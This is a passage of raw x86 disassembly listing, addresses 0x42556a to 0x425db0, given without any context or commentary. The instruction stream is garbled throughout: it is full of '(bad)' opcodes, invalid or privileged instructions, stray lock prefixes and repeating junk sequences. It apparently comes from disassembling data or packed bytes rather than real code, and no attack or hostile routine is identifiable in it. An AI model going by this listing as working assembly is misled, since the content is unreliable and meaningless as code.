  42556a:	out    dx,eax
  42556b:	lea    edx,[edi-0x785d7880]
  425571:	cmp    eax,0x938d8dee
  425576:	cdq    
  425577:	mul    BYTE PTR fs:[edi+ebp*2]
  42557b:	cmp    BYTE PTR [eax-0x59],dl
  42557e:	xor    bh,BYTE PTR [edi+esi*2-0x76]
  425582:	cmc    
  425583:	and    al,0x6f
  425585:	cmp    BYTE PTR [edi+esi*2-0x79],bh
  425589:	imul   BYTE PTR [edi+ebp*2]
  42558c:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  425590:	xchg   esi,eax
  425591:	mov    ch,0xcb
  425593:	scas   al,BYTE PTR es:[edi]
  425594:	xor    BYTE PTR [edi+0x32],0x80
  425598:	lock xor bl,BYTE PTR [ebx-0x2cfef21e]
  42559f:	cmp    ch,BYTE PTR [ebx+0x2a53fc53]
  4255a5:	mov    dl,0x86
  4255a7:	or     al,0xb2
  4255a9:	mov    edx,0x50b2ff29
  4255ae:	ja     0x42553b
  4255b0:	jl     0x425629
  4255b2:	sbb    esp,0x24
  4255b5:	outs   dx,DWORD PTR ds:[esi]
  4255b6:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  4255ba:	inc    edi
  4255bb:	sbb    al,0xf9
  4255bd:	adc    edi,DWORD PTR [edi+esi*2-0x7c]
  4255c1:	out    dx,eax
  4255c2:	lea    ecx,[ebp-0x7f8f7f73]
  4255c8:	ja     0x425554
  4255ca:	xor    al,0x8a
  4255cd:	push   ebx
  4255ce:	sub    dh,BYTE PTR [edx-0x3acd646]
  4255d4:	mov    dl,0x86
  4255d6:	or     al,0xff
  4255d8:	mov    dl,0x80
  4255da:	lock xor al,BYTE PTR [eax+0x51533297]
  4255e1:	push   ebx
  4255e2:	pushf  
  4255e3:	mov    dl,0xbe
  4255e5:	or     al,0xb2
  4255e7:	clc    
  4255e8:	sub    edi,edi
  4255ea:	dec    BYTE PTR [ecx]
  4255ec:	and    dh,BYTE PTR [edx+0x778092c4]
  4255f2:	enter  0xf080,0xc8
  4255f6:	mov    dl,0x86
  4255f8:	sub    DWORD PTR [edx-0x4d00f346],esi
  4255fe:	push   ebx
  4255ff:	je     0x425651
  425601:	ja     0x42558e
  425603:	add    DWORD PTR [edi-0x75],esi
  425606:	or     al,BYTE PTR [esi+0x4d4dcc1a]
  42560c:	push   eax
  42560d:	ja     0x42559a
  42560f:	xor    BYTE PTR [edi-0x75],0x80
  425613:	lock enter 0xf50,0x1
  425618:	add    BYTE PTR [esi],0x4d
  42561b:	dec    ebp
  42561c:	xor    BYTE PTR [edi-0x76],0x80
  425620:	lock mov dl,BYTE PTR [ebx-0x4]
  425624:	push   ebx
  425625:	sub    dh,BYTE PTR [edx-0x454df37a]
  42562b:	sub    edi,edi
  42562d:	mov    dl,0xec
  42562f:	ja     0x4255f9
  425631:	push   eax
  425632:	ja     0x4255fc
  425634:	xor    BYTE PTR [edi-0x79],0x80
  425638:	lock xchg DWORD PTR [ebx+0x2a],edx
  42563c:	mov    dl,0xba
  42563e:	sub    DWORD PTR [ebx-0x4],edx
  425641:	mov    dl,0x86
  425643:	or     al,0xff
  425645:	mov    dl,0x80
  425647:	lock mov al,BYTE PTR [eax+0x51538a97]
  42564e:	push   ebx
  42564f:	pushf  
  425650:	mov    dl,0xbe
  425652:	or     al,0xb2
  425654:	clc    
  425655:	sub    edi,edi
  425657:	inc    BYTE PTR [ebx-0x4e]
  42565a:	xor    al,0xc8
  42565d:	arpl   bp,di
  42565f:	fstp   DWORD PTR [edx]
  425661:	xor    BYTE PTR [edi-0x7],0x80
  425665:	lock stc 
  425667:	push   ebx
  425668:	cld    
  425669:	push   ebx
  42566a:	sub    dh,BYTE PTR [edx-0x454df37a]
  425670:	sub    edi,edi
  425672:	mov    dl,0x50
  425674:	ja     0x425601
  425676:	jl     0x4256ef
  425678:	xchg   DWORD PTR [edx-0x7fc790e2],ebp
  42567e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42567f:	mov    esi,0x8d8d8dcd
  425684:	xor    al,0x83
  425687:	xor    BYTE PTR [edi-0x7d],0x53
  42568b:	jl     0x42563f
  42568d:	test   BYTE PTR [ecx],ch
  42568f:	push   ebx
  425690:	push   ecx
  425691:	mov    dl,0xbe
  425693:	or     al,0xff
  425695:	std    
  425696:	xor    BYTE PTR [edi-0x75],0x94
  42569a:	xchg   BYTE PTR [eax+0x77],dl
  42569d:	add    BYTE PTR [eax-0x72701089],0x10
  4256a4:	ja     0x42566a
  4256a6:	(bad)  
  4256a7:	ja     0x42566d
  4256a9:	xor    al,0x8b
  4256ac:	or     eax,esp
  4256ae:	push   0x53
  4256b0:	mov    dl,0x50
  4256b2:	ja     0x42567c
  4256b4:	xor    BYTE PTR [edi-0x79],0x80
  4256b8:	lock xchg DWORD PTR [ebx-0x4],edx
  4256bc:	mov    dl,0x86
  4256be:	or     al,0x53
  4256c0:	sub    dh,BYTE PTR [edx-0x4d00d646]
  4256c6:	xor    al,0xc8
  4256c9:	xor    esi,DWORD PTR [edx-0x7db0f080]
  4256cf:	push   es
  4256d0:	dec    ebp
  4256d1:	dec    ebp
  4256d2:	xor    al,0x82
  4256d5:	push   ebx
  4256d6:	mov    dl,0x50
  4256d8:	ja     0x425665
  4256da:	xor    BYTE PTR [edi-0x76],0x80
  4256de:	lock mov dl,BYTE PTR [ebx-0x4]
  4256e2:	push   ebx
  4256e3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256e9:	sub    edi,edi
  4256eb:	mov    dl,0x3a
  4256ed:	ja     0x4256de
  4256ef:	xor    BYTE PTR [edi-0x76],0x80
  4256f3:	lock mov dl,BYTE PTR [ebx-0x4]
  4256f7:	push   ebx
  4256f8:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256fe:	sub    edi,edi
  425700:	mov    dl,0x3f
  425702:	ja     0x425688
  425704:	xor    BYTE PTR [edi+0x32],0x80
  425708:	lock xor dl,BYTE PTR [ebx+0x2a]
  42570c:	push   ebx
  42570d:	cld    
  42570e:	mov    dl,0xba
  425710:	sub    DWORD PTR [edx-0x4d00f37a],esi
  425716:	xor    al,0x84
  425719:	arpl   bp,di
  42571b:	or     DWORD PTR [edi-0x4d],ecx
  42571e:	dec    ebp
  42571f:	dec    ebp
  425720:	dec    ebp
  425721:	xor    BYTE PTR [edi-0x7],0x80
  425725:	lock stc 
  425727:	push   ebx
  425728:	cld    
  425729:	push   ebx
  42572a:	sub    dh,BYTE PTR [edx-0x794dd646]
  425730:	or     al,0xab
  425732:	push   DWORD PTR [edx-0x56740f80]
  425738:	push   ebx
  425739:	mov    dl,0xa3
  42573b:	jo     0x425738
  42573d:	out    dx,al
  42573e:	lea    edx,[edi-0x78127880]
  425744:	jno    0x425799
  425746:	jo     0x4256db
  425748:	fwait
  425749:	pop    edi
  42574a:	lock out dx,eax
  42574c:	or     DWORD PTR [edi],ecx
  42574e:	pop    esp
  42574f:	lea    ecx,[ebp+0x905638d]
  425755:	mov    cr1,ebp
  425758:	lea    ecx,[ebp+0x2d995c09]
  42575e:	pop    esi
  42575f:	and    al,0x38
  425761:	lea    ecx,[ebp+0x508af050]
  425767:	lock xor dl,BYTE PTR [ebx-0x9]
  42576b:	push   eax
  42576c:	lock mov edi,DWORD PTR [ecx-0x49460180]
  425773:	jo     0x4257c8
  425775:	dec    ebp
  425776:	jl     0x4257ef
  425778:	enter  0x4d07,0x4d
  42577c:	dec    ebp
  42577d:	mov    ecx,0xc5d3cb63
  425782:	mov    ecx,0xb98ae780
  425787:	mov    dh,0x7c
  425789:	mov    ecx,0x5c098b53
  42578e:	lock mov eax,DWORD PTR [ecx]
  425791:	and    esp,ebx
  425793:	mov    ecx,0xd70cdf5f
  425798:	pop    ebx
  425799:	or     DWORD PTR [eax+esi*1+0x50],ebx
  42579d:	lock enter 0x63b9,0xfd
  4257a2:	xlat   BYTE PTR ds:[ebx]
  4257a3:	iret   
  4257a4:	or     DWORD PTR [eax+esi*8-0x76],ebx
  4257a8:	and    BYTE PTR [edi+0x1f65cdef],0x8d
  4257af:	aad    0x53
  4257b1:	or     DWORD PTR [eax+esi*8-0x76],ebx
  4257b5:	and    BYTE PTR [edi-0x5f64611],0x21
  4257bc:	pop    ds
  4257bd:	mov    ecx,0x53b9b2b6
  4257c2:	std    
  4257c3:	mov    ecx,0xd5c8f05f
  4257c8:	and    edi,DWORD PTR [edi+esi*2-0x38]
  4257cc:	xchg   BYTE PTR [ebp+0x4d],cl
  4257cf:	dec    ebp
  4257d0:	dec    ebp
  4257d1:	ja     0x42575e
  4257d3:	cmp    ch,0xb9
  4257d6:	push   ebx
  4257d7:	mov    cl,0x2d
  4257d9:	mov    ecx,0x5fb970b6
  4257de:	lock mov esp,esp
  4257e1:	cmc    
  4257e2:	les    esp,FWORD PTR [esi+0x7c32774d]
  4257e8:	ja     0x4257b2
  4257ea:	mov    esi,0x94d4d4d
  4257ef:	pop    esp
  4257f0:	out    0x8a,eax
  4257f2:	and    BYTE PTR [edi+0x5d7053ef],0x21
  4257f9:	sub    edx,ebp
  4257fb:	pop    ss
  4257fc:	dec    ebp
  4257fd:	ja     0x425789
  4257ff:	in     eax,dx
  425800:	out    0xc8,eax
  425802:	xchg   BYTE PTR [ecx],cl
  425804:	dec    edi
  425805:	ror    BYTE PTR [ebp+0x4d],1
  425808:	dec    ebp
  425809:	push   ebx
  42580a:	push   0xffffffab
  42580c:	mov    ds:0x8deefb70,eax
  425811:	xor    al,0x32
  425814:	mov    ecx,0x53b9b2b6
  425819:	std    
  42581a:	push   ebx
  42581b:	push   0xffffffb9
  42581d:	arpl   WORD PTR [ecx+0x6a16092d],si
  425823:	les    eax,FWORD PTR [edx]
  425825:	xchg   edi,eax
  425826:	add    BYTE PTR [edi-0x6c427813],0x99
  42582d:	fwait
  42582e:	loop   0x425875
  425830:	dec    ebp
  425831:	xlat   BYTE PTR ds:[ebx]
  425832:	out    dx,eax
  425833:	xor    BYTE PTR [edx],0x86
  425836:	inc    ebx
  425837:	mov    ecx,DWORD PTR [ebp+0x4d]
  42583a:	add    DWORD PTR [ecx-0x40],edi
  42583d:	push   eax
  42583e:	ja     0x425866
  425840:	add    DWORD PTR [ecx+0x75],edi
  425843:	push   eax
  425844:	ja     0x425874
  425846:	add    DWORD PTR [ecx-0x47],edi
  425849:	push   eax
  42584a:	ja     0x425882
  42584c:	add    DWORD PTR [eax+edx*1-0x73],ecx
  425850:	lea    ecx,[ebp+0x13e7750]
  425856:	dec    esp
  425857:	cmc    
  425858:	lea    ecx,[ebp+0x4677508d]
  42585e:	add    DWORD PTR [edi+ebp*4-0x73],ecx
  425862:	lea    ecx,[ebp+0x1627750]
  425868:	dec    esp
  425869:	mov    BYTE PTR [ebp+0x77508d8d],cl
  42586f:	push   esi
  425870:	add    DWORD PTR [ecx+esi*2+0x3a],ecx
  425874:	lea    ecx,[ebp+0x15e7750]
  42587a:	dec    esp
  42587b:	aam    0x3a
  42587d:	lea    ecx,[ebp+0x50667750]
  425883:	xlat   BYTE PTR ds:[ebx]
  425884:	push   ds
  425885:	add    DWORD PTR [ebp+edx*4+0x3a],ecx
  425889:	lea    ecx,[ebp-0x7f9588b0]
  42588f:	dec    esp
  425890:	cmp    cl,BYTE PTR ds:[ebp+0x5381808d]
  425897:	jb     0x4258e9
  425899:	xchg   edi,eax
  42589a:	not    DWORD PTR [eax-0x69]
  42589d:	jp     0x4258ef
  42589f:	xchg   edi,eax
  4258a0:	adc    BYTE PTR [eax-0x69],0x83
  4258a4:	jl     0x42591d
  4258a6:	std    
  4258a7:	(bad)  [esi-0x79a1ee21]
  4258ad:	pop    DWORD PTR [ebx+0x26]
  4258b0:	push   eax
  4258b1:	ja     0x425862
  4258b3:	xor    al,0xfd
  4258b6:	and    bh,0xaf
  4258b9:	push   ebx
  4258ba:	mov    esp,DWORD PTR [edx-0x20a724fb]
  4258c0:	adc    DWORD PTR [ecx],ecx
  4258c2:	inc    esi
  4258c3:	retf   
  4258c4:	or     al,0xb2
  4258c6:	popa   
  4258c7:	or     al,0x50
  4258c9:	out    0xf9,eax
  4258cb:	and    bh,0xfd
  4258ce:	and    BYTE PTR [edi+0x53ac80af],0x4d
  4258d5:	push   ebx
  4258d6:	test   DWORD PTR [edx+0x2aff29b4],esi
  4258dc:	and    bh,0xf9
  4258df:	icebp  
  4258e0:	lea    ecx,[ebp+0x353cd8d]
  4258e6:	inc    DWORD PTR [esi]
  4258e8:	jmp    FWORD PTR [edx]
  4258ea:	push   eax
  4258eb:	xlat   BYTE PTR ds:[ebx]
  4258ec:	mov    ecx,DWORD PTR [ecx]
  4258ee:	(bad)  
  4258f0:	lea    ecx,[ebp-0x8885d73]
  4258f6:	rcr    ebp,0x86
  4258f9:	outs   dx,DWORD PTR ds:[esi]
  4258fa:	pusha  
  4258fb:	mov    esi,0xe26438f
  425900:	lock jp 0x4258a5
  425903:	ja     0x425887
  425905:	rcr    ebp,0x52
  425908:	or     al,0xe
  42590a:	lock add DWORD PTR [eax-0x287f0210],0xffffffaf
  425912:	and    bh,0xfd
  425915:	and    BYTE PTR [edi-0x5dcdac51],0x5
  42591c:	fistp  DWORD PTR [eax-0x21]
  42591f:	adc    DWORD PTR [ecx],ecx
  425921:	inc    esi
  425922:	add    eax,0x29bcb20c
  425927:	mov    dl,0x88
  425929:	or     al,0x53
  42592b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42592c:	push   ebx
  42592d:	test   edi,edi
  42592f:	adc    edi,edi
  425931:	dec    ebx
  425932:	in     eax,dx
  425933:	mov    dl,0x4d
  425935:	in     eax,dx
  425936:	jle    0x425985
  425938:	push   eax
  425939:	lock std 
  42593b:	push   eax
  42593c:	xlat   BYTE PTR ds:[ebx]
  42593d:	scas   eax,DWORD PTR es:[edi]
  42593e:	xor    al,0xf7
  425941:	push   eax
  425943:	jp     0x42591a
  425945:	and    esp,DWORD PTR [edx+0x36ff777]
  42594b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42594c:	retf   
  42594d:	pusha  
  42594e:	sbb    edi,edx
  425950:	jp     0x425905
  425952:	push   cs
  425953:	lock jp 0x4258f8
  425956:	ja     0x4258da
  425958:	sti    
  425959:	jl     0x425937
  42595b:	int3   
  42595c:	push   cs
  42595d:	lock add esp,0x1d
  425961:	mov    ds:0xddc1f7f0,al
  425966:	xchg   BYTE PTR [ecx+0x30],bh
  425969:	ja     0x4259e5
  42596b:	mov    ds:0xddc182b7,al
  425970:	push   edx
  425971:	jmp    0x438f:0xbe83b7a2
  425978:	es xor al,0xfd
  42597c:	xor    al,0xaf
  42597f:	and    bh,0xfd
  425982:	and    BYTE PTR [edi+0x63609af],0xc
  425989:	mov    dl,0xbe
  42598b:	sub    DWORD PTR [ebx+0xb],edx
  42598e:	inc    esi
  425990:	mov    dl,0xbc
  425992:	or     al,0xff
  425994:	sub    ah,BYTE PTR [edx-0x20a726fb]
  42599a:	adc    DWORD PTR [eax-0x10],edx
  42599d:	std    
  42599e:	push   ebx
  42599f:	xor    dl,BYTE PTR [eax-0x29]
  4259a2:	scas   eax,DWORD PTR es:[edi]
  4259a3:	xor    al,0xfd
  4259a6:	adc    bh,0xaf
  4259a9:	and    bh,0xfd
  4259ac:	and    BYTE PTR [edi-0x5dcdac51],0x5
  4259b3:	fistp  DWORD PTR [eax-0x21]
  4259b6:	adc    DWORD PTR [ecx],ecx
  4259b8:	inc    esi
  4259b9:	add    eax,0x29bcb20c
  4259be:	mov    dl,0x88
  4259c0:	or     al,0x53
  4259c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259c3:	push   ebx
  4259c4:	test   edi,edi
  4259c6:	adc    edi,edi
  4259c8:	dec    ebx
  4259c9:	call   DWORD PTR [ecx+0x9]
  4259cc:	dec    edi
  4259cd:	ror    BYTE PTR [ebp+0x4d],0x4d
  4259d1:	adc    bh,0x8b
  4259d4:	dec    edi
  4259d5:	or     ecx,DWORD PTR [ecx]
  4259d7:	mov    cr1,ebp
  4259da:	lea    ecx,[ebp-0x7f9a8680]
  4259e0:	in     eax,0x81
  4259e2:	fucomp st(4)
  4259e4:	or     eax,0x80359b80
  4259e9:	leave  
  4259ea:	and    eax,0x802d7b80
  4259ef:	stos   DWORD PTR es:[edi],eax
  4259f0:	sbb    eax,0x97507eec
  4259f5:	scas   eax,DWORD PTR es:[edi]
  4259f6:	sbb    BYTE PTR [ebx-0x13ae13eb],0xfc
  4259fd:	push   eax
  4259fe:	lock xchg DWORD PTR [eax+0x77],edx
  425a02:	jp     0x425a54
  425a04:	xchg   edi,eax
  425a05:	enter  0x9463,0xdb
  425a09:	in     al,dx
  425a0a:	push   eax
  425a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a0c:	enter  0x7253,0x50
  425a10:	xchg   edi,eax
  425a11:	sbb    DWORD PTR [edi-0x69],0xffffffc8
  425a15:	(bad)  
  425a17:	(bad)  
  425a18:	in     al,dx
  425a19:	xor    BYTE PTR [edi+0x7a],0x80
  425a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a1e:	scas   eax,DWORD PTR es:[edi]
  425a1f:	or     DWORD PTR [ebp+eiz*1-0x6d],ebx
  425a23:	arpl   WORD PTR [ebx+0x63b3d31d],bx
  425a29:	stos   DWORD PTR es:[edi],eax
  425a2a:	adc    eax,0xee80a9d3
  425a2f:	pop    edx
  425a30:	adc    BYTE PTR [edi+0x202580ef],0x50
  425a37:	xchg   edi,eax
  425a38:	mov    ch,ah
  425a3a:	cld    
  425a3b:	add    DWORD PTR [edi+0x4304ec1e],edx
  425a41:	xchg   edi,eax
  425a42:	out    dx,eax
  425a43:	push   eax
  425a44:	ja     0x425a78
  425a46:	push   eax
  425a47:	xchg   edi,eax
  425a48:	jbe    0x425ac6
  425a4a:	ja     0x425a45
  425a4c:	dec    DWORD PTR [ebp-0x687f7273]
  425a52:	mov    ch,ch
  425a54:	(bad)  
  425a55:	(bad)  
  425a56:	xlat   BYTE PTR ds:[ebx]
  425a57:	sub    DWORD PTR [edx],ecx
  425a59:	xor    BYTE PTR [edi+0x76],0x80
  425a5d:	push   ebp
  425a5e:	jno    0x4259e6
  425a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a61:	mov    cl,BYTE PTR [ebp+0x4d]
  425a64:	adc    bh,0x8b
  425a67:	xor    al,0x87
  425a6a:	dec    edi
  425a6b:	push   0xffffffd5
  425a6d:	das    
  425a6e:	xor    BYTE PTR [edi-0x76],0x50
  425a72:	sbb    eax,0xed327780
  425a77:	ja     0x425a03
  425a79:	out    dx,al
  425a7a:	dec    ebp
  425a7b:	lock stc 
  425a7d:	xlat   BYTE PTR ds:[ebx]
  425a7e:	mov    dh,0x80
  425a80:	xchg   edi,eax
  425a81:	sbb    eax,0x50
  425a84:	xchg   edi,eax
  425a85:	and    DWORD PTR [ebx-0x69],0xffffffc8
  425a89:	in     al,0xdc
  425a8b:	stos   DWORD PTR es:[edi],eax
  425a8c:	cmp    ah,0xa9
  425a8f:	mov    ds:0x8deefb70,eax
  425a94:	xchg   edi,eax
  425a95:	add    BYTE PTR [edi-0x10287f67],0x4d
  425a9c:	loopne 0x425ad0
  425a9e:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  425aa4:	xchg   ch,ah
  425aa6:	int3   
  425aa7:	dec    ebp
  425aa8:	dec    ebp
  425aa9:	or     BYTE PTR [esi+edi*1+0x3a],0x8d
  425aae:	lea    edx,[ebx+0x70]
  425ab1:	pop    edi
  425ab2:	out    dx,eax
  425ab3:	test   eax,0x80b21809
  425ab8:	mov    dl,0xa7
  425aba:	sti    
  425abb:	out    dx,al
  425abc:	lea    eax,[eax-0x72c5e1e4]
  425ac2:	lea    edx,[ebx+0x5e328099]
  425ac8:	and    al,0x38
  425aca:	lea    ecx,[ebp-0x2ac5e3c]
  425ad0:	mov    ecx,0x50b970b6
  425ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ad6:	in     eax,dx
  425ad7:	sti    
  425ad8:	or     al,0xed
  425ada:	cld    
  425adb:	or     al,0x9
  425add:	pop    esp
  425ade:	mov    eax,ds:0xd7fd63b9
  425ae3:	pop    es
  425ae4:	push   ebx
  425ae5:	push   0xffffffa9
  425ae7:	mov    ecx,0xce800c50
  425aec:	push   ds
  425aed:	cmp    cl,BYTE PTR [ebp-0x648b5c73]
  425af3:	or     BYTE PTR [ebx+0x3a1e4c80],0x8d
  425afa:	lea    esi,[edx+0x7cec6fbc]
  425b00:	les    esp,FWORD PTR [esi-0x3232fa33]
  425b06:	mov    esi,0x6def10bd
  425b0b:	fmul   DWORD PTR [edi-0x7934325a]
  425b11:	xlat   BYTE PTR ds:[ebx]
  425b12:	popa   
  425b13:	cld    
  425b14:	lea    ecx,[ebp+0x3a1e4c80]
  425b1a:	lea    ecx,[ebp+0x74ab7cec]
  425b20:	xchg   edi,eax
  425b21:	add    BYTE PTR [edi-0x72a5785e],0x8d
  425b28:	lea    edx,[ebx+0x438f8660]
  425b2e:	es cdq 
  425b30:	fwait
  425b31:	jl     0x425baa
  425b33:	enter  0x58e4,0xdf
  425b37:	adc    DWORD PTR [eax-0x10],edx
  425b3a:	mov    edi,DWORD PTR [edi+esi*2-0x79]
  425b3e:	fstp   DWORD PTR [eax-0x21]
  425b41:	adc    DWORD PTR [eax-0x10],edx
  425b44:	xor    dl,BYTE PTR [ebx+0x6a]
  425b47:	jl     0x425bc0
  425b49:	xchg   dh,dh
  425b4b:	and    al,0x6f
  425b4d:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  425b51:	cmc    
  425b52:	and    al,0x6f
  425b54:	cmp    BYTE PTR [edi+esi*2-0x9],bh
  425b58:	call   0x50543ab5
  425b5d:	lock jp 0x425bdc
  425b60:	ja     0x425bc0
  425b62:	out    0x58,al
  425b64:	fist   WORD PTR [ecx]
  425b66:	push   eax
  425b67:	lock data16 xor BYTE PTR [edi-0x79],0x80
  425b6d:	xchg   edi,eax
  425b6e:	xor    cl,BYTE PTR [ecx]
  425b70:	inc    esi
  425b71:	test   DWORD PTR [edx+esi*4],0x97800c07
  425b78:	xchg   DWORD PTR [eax-0x74dcd29],eax
  425b7e:	sub    DWORD PTR [edi+eiz*4-0x39],ebp
  425b82:	add    al,0xd4
  425b84:	push   ebx
  425b85:	jl     0x425bda
  425b87:	or     edi,edi
  425b89:	cld    
  425b8a:	push   eax
  425b8b:	ja     0x425b10
  425b8d:	add    DWORD PTR [edi-0x7c],esi
  425b90:	push   eax
  425b91:	ja     0x425b42
  425b93:	xor    BYTE PTR [edi-0x51],0xfa
  425b97:	and    ah,BYTE PTR [edi+ebp*2]
  425b9a:	cmp    BYTE PTR [ebp+ecx*4-0x47],bh
  425b9e:	pop    eax
  425b9f:	fist   WORD PTR [ecx]
  425ba1:	push   eax
  425ba2:	jge    0x425b92
  425ba4:	xor    al,0x8a
  425ba7:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  425bae:	or     al,0xe2
  425bb0:	or     eax,0xb2f7539d
  425bb5:	clc    
  425bb6:	sub    edi,edi
  425bb8:	inc    BYTE PTR [eax-0x587f7569]
  425bbe:	mov    dl,BYTE PTR [ebx+0x7e]
  425bc1:	mov    dl,0x7
  425bc3:	or     al,0x53
  425bc5:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425bcc:	inc    BYTE PTR [eax-0x587f7569]
  425bd2:	mov    dl,BYTE PTR [ebx+0x7e]
  425bd5:	mov    dl,0x7
  425bd7:	or     al,0x53
  425bd9:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425be0:	inc    BYTE PTR [eax-0x587f7569]
  425be6:	mov    dl,BYTE PTR [ebx+0x7e]
  425be9:	mov    dl,0x7
  425beb:	or     al,0x53
  425bed:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  425bf4:	(bad)  
  425bf5:	push   eax
  425bf6:	add    DWORD PTR [edx+0x4d],edx
  425bf9:	dec    ebp
  425bfa:	dec    ebp
  425bfb:	xor    al,0x86
  425bfe:	adc    BYTE PTR [edi+0x53f75386],0x51
  425c05:	mov    dl,0xf8
  425c07:	sub    DWORD PTR [edx-0x100f342],esi
  425c0d:	adc    BYTE PTR [edi-0x79587f7a],0x53
  425c14:	jle    0x425c69
  425c16:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  425c1d:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c24:	dec    ebp
  425c25:	dec    ebp
  425c26:	xor    al,0x21
  425c29:	xor    BYTE PTR [eax],0x80
  425c2c:	xchg   edi,eax
  425c2d:	mov    al,BYTE PTR [eax+0x7f808aa7]
  425c33:	or     dl,BYTE PTR [ebx-0x7e]
  425c36:	push   ebx
  425c37:	jle    0x425beb
  425c39:	pop    es
  425c3a:	or     al,0xb2
  425c3c:	mov    ah,0x29
  425c3e:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  425c45:	dec    ebp
  425c46:	dec    ebp
  425c47:	xor    al,0x71
  425c4a:	adc    BYTE PTR [edi+0x53f75371],0x51
  425c51:	mov    dl,0xf8
  425c53:	sub    DWORD PTR [edx-0x100f342],esi
  425c59:	adc    BYTE PTR [edi-0x75587f76],0x53
  425c60:	add    BYTE PTR [eax+0x7e538a77],0xb2
  425c67:	pop    es
  425c68:	or     al,0xb2
  425c6a:	mov    ah,0x29
  425c6c:	call   DWORD PTR [eax+eax*4-0x3ac7559]
  425c73:	mov    dl,0x86
  425c75:	or     al,0xed
  425c77:	(bad)  
  425c78:	or     eax,0xff29b4b2
  425c7d:	je     0x425c6b
  425c7f:	test   DWORD PTR [eax+0x41501577],0x4d4dd518
  425c89:	dec    ebp
  425c8a:	xor    al,0x15
  425c8d:	in     eax,dx
  425c8e:	add    eax,0x29bab20d
  425c93:	push   ebx
  425c94:	cld    
  425c95:	mov    dl,0x86
  425c97:	or     al,0xff
  425c99:	mov    dl,0x80
  425c9b:	lock mov al,BYTE PTR [eax-0x3d127569]
  425ca2:	or     eax,0xf8b25153
  425ca7:	sub    DWORD PTR [edx-0x100f342],esi
  425cad:	adc    BYTE PTR [edi-0x75587f76],0x53
  425cb4:	jle    0x425ca3
  425cb6:	(bad)  
  425cb7:	or     eax,0xb20c07b2
  425cbc:	mov    ah,0x29
  425cbe:	call   DWORD PTR [esp+ebp*8-0x75687f02]
  425cc5:	and    BYTE PTR [edi-0x1281ac76],0xc6
  425ccc:	or     eax,0xb229b4b2
  425cd1:	pop    es
  425cd2:	or     al,0xff
  425cd4:	xchg   esp,eax
  425cd5:	in     al,dx
  425cd6:	(bad)  
  425cd7:	push   eax
  425cd8:	xend   
  425cdb:	dec    ebp
  425cdc:	dec    ebp
  425cdd:	dec    ebp
  425cde:	add    DWORD PTR [edi+0x52],ecx
  425ce1:	dec    ebp
  425ce2:	dec    ebp
  425ce3:	dec    ebp
  425ce4:	or     al,BYTE PTR [eax-0xf7f7589]
  425cea:	mov    ah,dl
  425cec:	or     eax,0x53fc53a3
  425cf1:	adc    DWORD PTR [edx-0x454df37a],esi
  425cf7:	sub    edi,edi
  425cf9:	mov    dl,0xa
  425cfb:	xor    BYTE PTR [edi+0x2d],0x1
  425cff:	adc    ch,dh
  425d01:	lea    ecx,[ebp-0x327f6973]
  425d07:	cmp    cl,BYTE PTR ds:[ebp+0x4d814d8d]
  425d0e:	xchg   edi,eax
  425d0f:	and    eax,0x5055f080
  425d14:	cmp    al,BYTE PTR [eax-0xf7f7b89]
  425d1a:	stc    
  425d1b:	or     DWORD PTR [esi-0x3],eax
  425d1e:	or     al,0xb2
  425d20:	mov    esi,0x84f0800c
  425d25:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425d2c:	push   edi
  425d2e:	stos   BYTE PTR es:[edi],al
  425d2f:	dec    ebp
  425d30:	xlat   BYTE PTR ds:[ebx]
  425d31:	xor    eax,0x4d29bab2
  425d36:	xlat   BYTE PTR ds:[ebx]
  425d37:	inc    ebp
  425d38:	xchg   ah,cl
  425d3a:	add    eax,0x77804d4d
  425d3f:	test   BYTE PTR [eax+0x4609f9f0],al
  425d45:	std    
  425d46:	or     al,0xb2
  425d48:	mov    esi,0x84f0800c
  425d4d:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425d54:	push   edi
  425d56:	stos   BYTE PTR es:[edi],al
  425d57:	dec    ebp
  425d58:	xlat   BYTE PTR ds:[ebx]
  425d59:	push   ebp
  425d5a:	mov    dl,0xba
  425d5c:	sub    DWORD PTR [ebp-0x29],ecx
  425d5f:	cmp    eax,0x4d059886
  425d64:	dec    ebp
  425d65:	xor    BYTE PTR [edi-0x76],0x80
  425d69:	lock mov dl,BYTE PTR [ebx+0x11]
  425d6d:	mov    dl,0xba
  425d6f:	sub    DWORD PTR [ebx-0x4],edx
  425d72:	mov    dl,0x86
  425d74:	or     al,0xff
  425d76:	mov    dl,0x80
  425d78:	lock mov al,BYTE PTR [eax+0x51538a97]
  425d7f:	mov    dl,0xbe
  425d81:	or     al,0x53
  425d83:	xchg   esp,eax
  425d84:	mov    dl,0xf8
  425d86:	sub    edi,edi
  425d88:	(bad)  
  425d89:	in     al,dx
  425d8a:	mov    dl,0x80
  425d8c:	lock mov al,BYTE PTR [eax+0x51538a97]
  425d93:	mov    dl,0xbe
  425d95:	or     al,0x53
  425d97:	xchg   esp,eax
  425d98:	mov    dl,0xf8
  425d9a:	sub    edi,edi
  425d9c:	(bad)  
  425d9d:	in     al,dx
  425d9e:	mov    dl,0x80
  425da0:	lock mov al,BYTE PTR [eax+0x51538a97]
  425da7:	mov    dl,0xbe
  425da9:	or     al,0x53
  425dab:	xchg   esp,eax
  425dac:	mov    dl,0xf8
  425dae:	sub    edi,edi
  425db0:	(bad)  
